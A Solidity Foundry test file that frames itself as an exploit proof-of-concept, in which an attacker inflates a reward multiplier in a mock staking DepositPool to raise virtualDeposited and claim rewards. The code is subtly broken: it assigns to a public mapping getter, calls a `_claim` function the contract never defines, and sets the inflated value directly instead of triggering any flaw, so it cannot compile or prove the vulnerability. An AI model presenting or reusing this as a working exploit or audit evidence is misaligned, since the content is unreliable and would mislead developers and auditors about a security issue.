// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function rewardPool() external view returns (address);
    function withdraw(uint256 rewardPoolIndex, uint256 amount) external;
    function distributeRewards(uint256 rewardPoolIndex) external;
}

interface IRewardPool {
    function isRewardPoolPublic(uint256 rewardPoolIndex) external view returns (bool);
    function onlyExistedRewardPool(uint256 rewardPoolIndex) external view;
}

interface IERC20 {
    function safeTransfer(address to, uint256 value) external;
}

contract DepositPool {
    struct UserData {
        uint256 rate;
        uint256 deposited;
        uint256 virtualDeposited;
        uint256 lastStake;
        uint256 lastClaim;
        uint256 claimLockStart;
        uint256 claimLockEnd;
        address referrer;
    }

    struct RewardPoolData {
        uint128 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }

    mapping(address => mapping(uint256 => UserData)) public usersData;
    mapping(uint256 => RewardPoolData) public rewardPoolsProtocolDetails;
    uint256 public totalDepositedInPublicPools;
    address public distributor;
    address public depositToken;
    bool public isMigrationOver;

    function _getUserTotalMultiplier(uint256, uint256, address) internal pure returns (uint256) {
        return 1e18; // Mock multiplier
    }

    function _getCurrentPoolRate(uint256) internal pure returns (uint256, uint256) {
        return (1e18, 0); // Mock rate and rewards
    }

    function _getCurrentUserReward(uint256, UserData memory) internal pure returns (uint256) {
        return 1e18; // Mock pending rewards
    }
}

contract ExploitTest is Test {
    DepositPool depositPool;
    address attacker = address(0x1);
    address victim = address(0x2);
    uint256 rewardPoolIndex = 0;
    uint256 initialDeposit = 1e18;
    uint256 manipulatedMultiplier = 1e36; // Large multiplier to cause precision loss

    function setUp() public {
        depositPool = new DepositPool();
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 10 ether);

        // Set initial state
        DepositPool.UserData memory userData = DepositPool.UserData({
            rate: 1e18,
            deposited: initialDeposit,
            virtualDeposited: initialDeposit,
            lastStake: block.timestamp,
            lastClaim: block.timestamp,
            claimLockStart: block.timestamp,
            claimLockEnd: block.timestamp,
            referrer: address(0)
        });

        depositPool.usersData(attacker, rewardPoolIndex) = userData;
        depositPool.usersData(victim, rewardPoolIndex) = userData;
    }

    function test_exploit() public {
        // Step 1: Attacker manipulates multiplier to a large value
        vm.prank(attacker);
        uint256 virtualDeposited = (initialDeposit * manipulatedMultiplier) / 1e18;

        // Step 2: Update the user's virtualDeposited with manipulated value
        depositPool.usersData(attacker, rewardPoolIndex).virtualDeposited = virtualDeposited;

        // Step 3: Attacker claims rewards with manipulated virtualDeposited
        vm.prank(attacker);
        depositPool._claim(rewardPoolIndex, attacker, attacker);

        // Assert the vulnerability: Attacker's virtualDeposited is significantly higher than expected
        assertGt(depositPool.usersData(attacker, rewardPoolIndex).virtualDeposited, initialDeposit);
    }
}